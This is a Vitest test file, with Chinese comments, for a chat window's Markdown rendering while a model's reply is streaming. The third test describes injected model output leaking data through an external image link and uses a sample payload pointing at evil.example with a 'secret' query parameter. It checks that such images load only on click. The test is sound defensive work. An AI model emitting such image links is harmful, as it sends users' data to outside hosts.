// @vitest-environment jsdom
/**
 * 流式期间就要按 Markdown 渲染（不是纯文本等回合结束）。
 * 改前 live 分支渲染的是纯文本，`**加粗**` 会原样出现；这里断言流式中就已经是 <strong>。
 *
 * Markdown 现在是懒加载分块（首屏不下载 472KB 的 react-markdown + highlight.js），
 * 测试环境里首次 import 要现场转换整个 Markdown 依赖图，所以断言都留给足够长的等待窗口，
 * 并且只查 .md 容器里的结构（页面别处也有 <strong>，比如耗时文案）。
 */
import { afterEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, render, screen, waitFor } from "@testing-library/react";
import { ChatWindow } from "@/components/ChatWindow";
import type { WebMessage } from "@/lib/types";

afterEach(cleanup);

const MARKDOWN_READY_TIMEOUT_MS = 20_000;

const streaming = {
	role: "assistant",
	id: "a1",
	content: [{ type: "text", text: "这是 **加粗** 与 `代码`。\n\n- 列表项\n" }],
	stopReason: "pending",
	timestamp: 1,
} as unknown as WebMessage;

describe("streaming markdown rendering", () => {
	it("renders markdown while the message is still pending", async () => {
		render(<ChatWindow messages={[streaming]} tools={{}} isStreaming />);
		// 节流窗口 + 懒加载分块之后，应出现真正的 Markdown 结构
		await waitFor(() => expect(document.querySelector(".md strong")).toBeTruthy(), { timeout: MARKDOWN_READY_TIMEOUT_MS });
		expect(document.querySelector(".md strong")?.textContent).toBe("加粗");
		expect(document.querySelector(".md code")?.textContent).toBe("代码");
		expect(document.querySelectorAll(".md li").length).toBeGreaterThan(0);
		// 不该把 Markdown 记号当纯文本留在界面上
		expect(screen.queryByText(/\*\*加粗\*\*/)).toBeNull();
	}, 30_000);

	it("keeps refreshing while text keeps arriving (throttle, not debounce)", async () => {
		// 回归：旧实现每次文本变化都清掉计时器重来，流式期间（约 16ms 一段）正文一直停在第一段
		const { StreamingMarkdownBlock } = await import("@/components/MarkdownBlock");
		vi.useFakeTimers();
		try {
			const { rerender, container } = render(<StreamingMarkdownBlock text="第0段" />);
			for (let i = 1; i <= 20; i += 1) {
				rerender(<StreamingMarkdownBlock text={`第${i}段`} />);
				act(() => { vi.advanceTimersByTime(20); });
			}
			const shown = Number(/第(\d+)段/.exec(container.textContent ?? "")?.[1]);
			expect(shown).toBeGreaterThanOrEqual(15);
		} finally {
			vi.useRealTimers();
		}
	}, 30_000);

	it("does not load external images until the user asks for it", async () => {
		// 被注入的模型输出可以用 ![](https://evil/?d=…) 把内容带出去：渲染时不能自动发请求
		const { MarkdownBlock } = await import("@/components/MarkdownBlock");
		const { container } = render(<MarkdownBlock text={"![秘密](https://evil.example/x.png?d=secret)\n\n![本地](/local.png)"} />);
		await waitFor(() => expect(container.querySelector(".md")).toBeTruthy(), { timeout: MARKDOWN_READY_TIMEOUT_MS });
		// 同源图片照常显示
		const images = [...container.querySelectorAll("img")].map((img) => img.getAttribute("src"));
		expect(images).toEqual(["/local.png"]);
		const button = screen.getByTitle("https://evil.example/x.png?d=secret");
		act(() => { button.click(); });
		expect([...container.querySelectorAll("img")].map((img) => img.getAttribute("src"))).toContain("https://evil.example/x.png?d=secret");
	}, 30_000);

	it("keeps rendering markdown after the stream settles", async () => {
		const done = { ...streaming, stopReason: "stop" } as unknown as WebMessage;
		const { rerender } = render(<ChatWindow messages={[streaming]} tools={{}} isStreaming />);
		await waitFor(() => expect(document.querySelector(".md strong")).toBeTruthy(), { timeout: MARKDOWN_READY_TIMEOUT_MS });
		rerender(<ChatWindow messages={[done]} tools={{}} isStreaming={false} />);
		await waitFor(() => expect(document.querySelector(".md strong")?.textContent).toBe("加粗"), { timeout: MARKDOWN_READY_TIMEOUT_MS });
	}, 30_000);
});
